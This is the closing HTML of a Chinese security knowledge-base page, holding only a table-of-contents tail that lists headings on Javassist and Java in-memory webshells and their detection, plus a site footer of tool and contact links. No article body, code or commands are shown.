class="table-of-contents__link toc-highlight">ClassPool</a></li><li><a href="#ctclass" class="table-of-contents__link toc-highlight">CtClass</a></li><li><a href="#ctmethod" class="table-of-contents__link toc-highlight">CtMethod</a></li></ul></li><li><a href="#示例" class="table-of-contents__link toc-highlight">示例</a></li></ul></li></ul></li><li><a href="#内存马" class="table-of-contents__link toc-highlight">内存马</a><ul><li><a href="#spring-boot的filter" class="table-of-contents__link toc-highlight">Spring Boot的Filter</a></li><li><a href="#java-agent修改dofilter" class="table-of-contents__link toc-highlight">Java agent修改doFilter</a></li></ul></li><li><a href="#拓展操作" class="table-of-contents__link toc-highlight">拓展操作</a></li><li><a href="#查杀" class="table-of-contents__link toc-highlight">查杀</a></li><li><a href="#风险" class="table-of-contents__link toc-highlight">风险</a></li><li><a href="#内存马复活" class="table-of-contents__link toc-highlight">内存马复活</a></li><li><a href="#总览" class="table-of-contents__link toc-highlight">总览</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">内容导航</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/friends">友情链接</a></li><li class="footer__item"><a class="footer__link-item" href="/promotions">我的推广</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">实用工具</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">在线Markdown<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Reverse Shell Generator<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GTFOBins<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">关注我</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="mailto:admin@gm7.org" target="_blank" rel="noopener noreferrer" class="footer__link-item">联系我<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库</div></div></div></footer></div>
</body>
</html>